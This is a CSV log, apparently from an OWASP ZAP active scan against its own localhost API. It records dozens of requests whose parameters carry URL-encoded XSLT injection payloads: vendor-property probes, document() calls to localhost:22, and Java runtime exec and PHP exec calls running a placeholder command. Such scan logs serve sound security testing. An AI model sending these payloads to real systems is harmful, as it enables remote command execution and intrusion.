ID,Request Tijdstempel,Response Tijdstempel,Methode,URL,Code,Reden,RTT,Grootte Resp. Header,Grootte Resp. Body
517022,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/override?apikey=ZAP&contextId=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,400,Bad Request,1,572,12
517023,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/usersList/override?apikey=ZAP&contextId=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,1,565,1187
517024,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/override?apikey=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&channelId=ZAP&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,400,Bad Request,1,572,13
517025,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/sendTextMessage/override?apikey=system-property%28%27xsl%3Avendor%27%29%2F%3E&channelId=ZAP&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,200,OK,0,565,1460
517026,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/usersList/override?apikey=ZAP&contextId=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,0,565,1187
517027,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/sendTextMessage/override?apikey=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&channelId=ZAP&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,200,OK,1,565,1460
517028,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/override?apikey=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,400,Bad Request,1,572,13
517029,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/setBreakTextMessage/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,200,OK,1,565,1256
517030,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/users/view/usersList/override?apikey=ZAP&contextId=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,0,565,1187
517031,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/override?apikey=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&channelId=ZAP&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,400,Bad Request,1,572,13
517032,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/setBreakTextMessage/override?apikey=system-property%28%27xsl%3Avendor%27%29%2F%3E&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,200,OK,1,565,1256
517033,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/sendTextMessage/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&channelId=ZAP&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,200,OK,1,565,1458
517034,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/view/breakTextMessage/override?apikey=%3C,200,OK,1,565,1088
517035,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/override?apikey=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,400,Bad Request,1,572,13
517036,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/sendTextMessage/override?apikey=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E&channelId=ZAP&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,200,OK,1,565,1460
517037,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/setBreakTextMessage/override?apikey=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,200,OK,1,565,1256
517038,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/override?apikey=ZAP&channelId=%3C&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,400,Bad Request,1,572,13
517039,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/sendTextMessage/override?apikey=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&channelId=ZAP&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,200,OK,0,565,1460
517040,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/override?apikey=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,400,Bad Request,1,572,13
517041,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/view/breakTextMessage/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,0,565,1088
517042,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/view/channels/override?apikey=%3C,200,OK,0,565,1048
517043,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/override?apikey=ZAP&channelId=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,400,Bad Request,1,572,13
517044,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/setBreakTextMessage/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,200,OK,0,565,1256
517045,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/view/channels/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,0,565,1048
517046,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/override?apikey=ZAP&message=%3C&outgoing=ZAP,400,Bad Request,1,572,13
517047,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/view/breakTextMessage/override?apikey=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,1,565,1089
517048,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/sendTextMessage/override?apikey=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&channelId=ZAP&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,200,OK,0,565,1460
517049,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/override?apikey=ZAP&message=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&outgoing=ZAP,400,Bad Request,1,572,13
517050,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/view/channels/override?apikey=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,1,565,1048
517051,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/setBreakTextMessage/override?apikey=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,200,OK,0,565,1256
517052,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/override?apikey=ZAP&channelId=system-property%28%27xsl%3Avendor%27%29%2F%3E&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,400,Bad Request,1,572,13
517053,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/sendTextMessage/override?apikey=ZAP&channelId=%3C&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,200,OK,1,565,1460
517054,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/override?apikey=ZAP&message=system-property%28%27xsl%3Avendor%27%29%2F%3E&outgoing=ZAP,400,Bad Request,1,572,13
517055,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/view/breakTextMessage/override?apikey=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,0,565,1089
517056,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/sendTextMessage/override?apikey=ZAP&channelId=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,200,OK,0,565,1460
517057,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/override?apikey=ZAP&channelId=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,400,Bad Request,1,572,13
517058,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/view/message/override?apikey=%3C&channelId=ZAP&messageId=ZAP,200,OK,1,565,1246
517059,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/setBreakTextMessage/override?apikey=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,200,OK,1,565,1256
517060,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/view/channels/override?apikey=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,0,565,1048
517061,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/sendTextMessage/override?apikey=ZAP&channelId=system-property%28%27xsl%3Avendor%27%29%2F%3E&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,200,OK,0,565,1459
517062,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/setBreakTextMessage/override?apikey=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,200,OK,1,565,1255
517063,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/view/breakTextMessage/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,0,565,1089
517064,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/override?apikey=ZAP&message=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&outgoing=ZAP,400,Bad Request,1,572,13
517065,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/sendTextMessage/override?apikey=ZAP&channelId=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&message=Zaproxy+alias+impedit+expedita+quisquam+pariatur+exercitationem.+Nemo+rerum+eveniet+dolores+rem+quia+dignissimos.&outgoing=ZAP,200,OK,1,565,1460
517066,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/setBreakTextMessage/override?apikey=ZAP&message=%3C&outgoing=ZAP,200,OK,1,565,1256
517067,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/view/channels/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,1,565,1048
517068,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/view/message/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&channelId=ZAP&messageId=ZAP,200,OK,0,565,1246
517069,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/setBreakTextMessage/override?apikey=ZAP&message=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&outgoing=ZAP,200,OK,0,565,1256
517070,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/view/breakTextMessage/override?apikey=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,200,OK,0,565,1089
517071,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/view/channels/override?apikey=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,200,OK,0,565,1048
517072,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/view/messages/override?apikey=%3C&channelId=ZAP&count=3&payloadPreviewLength=ZAP&start=ZAP,200,OK,0,565,1696
517073,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/view/message/override?apikey=system-property%28%27xsl%3Avendor%27%29%2F%3E&channelId=ZAP&messageId=ZAP,200,OK,1,565,1246
517074,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/view/messages/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&channelId=ZAP&count=3&payloadPreviewLength=ZAP&start=ZAP,200,OK,0,565,1696
517075,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/setBreakTextMessage/override?apikey=ZAP&message=system-property%28%27xsl%3Avendor%27%29%2F%3E&outgoing=ZAP,200,OK,0,565,1256
517076,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/view/message/override?apikey=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&channelId=ZAP&messageId=ZAP,200,OK,0,565,1246
517077,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/view/channels/override?apikey=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,1,565,1048
517078,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/view/override?apikey=%3C,400,Bad Request,1,572,12
517079,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/view/breakTextMessage/override?apikey=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,1,565,1089
517080,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/view/override?apikey=%3C&channelId=ZAP&messageId=ZAP,400,Bad Request,1,572,12
517081,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/view/message/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&channelId=ZAP&messageId=ZAP,200,OK,0,565,1245
517082,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/view/override?apikey=%3C&channelId=ZAP&count=3&payloadPreviewLength=ZAP&start=ZAP,400,Bad Request,1,572,12
517083,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/action/setBreakTextMessage/override?apikey=ZAP&message=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&outgoing=ZAP,200,OK,1,565,1256
517084,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/view/messages/override?apikey=system-property%28%27xsl%3Avendor%27%29%2F%3E&channelId=ZAP&count=3&payloadPreviewLength=ZAP&start=ZAP,200,OK,0,565,1696
517085,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/view/message/override?apikey=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E&channelId=ZAP&messageId=ZAP,200,OK,17,565,1246
517086,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/view/channels/override?apikey=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,18,565,1048
517087,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/view/messages/override?apikey=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&channelId=ZAP&count=3&payloadPreviewLength=ZAP&start=ZAP,200,OK,15,565,1696
517088,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/view/breakTextMessage/override?apikey=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,17,565,1088
517089,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/websocket/view/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&channelId=ZAP&count=3&payloadPreviewLength=ZAP&start=ZAP,400,Bad Request,17,572,12
